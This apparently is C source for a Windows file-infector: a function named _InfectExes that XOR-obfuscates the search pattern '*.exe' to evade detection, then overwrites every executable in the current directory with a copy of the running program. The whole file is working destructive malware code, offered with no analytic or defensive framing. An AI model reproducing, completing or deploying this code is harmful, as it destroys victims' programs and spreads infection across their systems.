#include "data_globals.h"
#include <windows.h>
#include <stdint.h>
#include <stddef.h>   // for size_t

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

uint32_t _InfectExes(void)
{
    uint32_t result;
    BOOL success;
    char current_exe_path[256];
    WIN32_FIND_DATAA file_data;
    HANDLE find_handle;

    // "*.exe" XOR'd with key 0x3E
    volatile char sz_pattern[] = {
        '*'^0x3E, '.'^0x3E, 'e'^0x3E, 'x'^0x3E, 'e'^0x3E, 0x00^0x3E
    };

    GetModuleFileNameA(NULL, current_exe_path, sizeof(current_exe_path));
    xor_decrypt(sz_pattern, sizeof(sz_pattern), 0x3E);
    find_handle = FindFirstFileA((char*)sz_pattern, &file_data);

    if (find_handle == INVALID_HANDLE_VALUE)
    {
        result = 1;
    }
    else
    {
        SetFileAttributesA(file_data.cFileName, FILE_ATTRIBUTE_NORMAL);
        CopyFileA(current_exe_path, file_data.cFileName, FALSE);

        while (TRUE)
        {
            success = FindNextFileA(find_handle, &file_data);
            if (success == 0) break;
            SetFileAttributesA(file_data.cFileName, FILE_ATTRIBUTE_NORMAL);
            CopyFileA(current_exe_path, file_data.cFileName, FALSE);
        }

        FindClose(find_handle);
        result = 0;
    }
    return result;
}
#pragma optimize("", on)
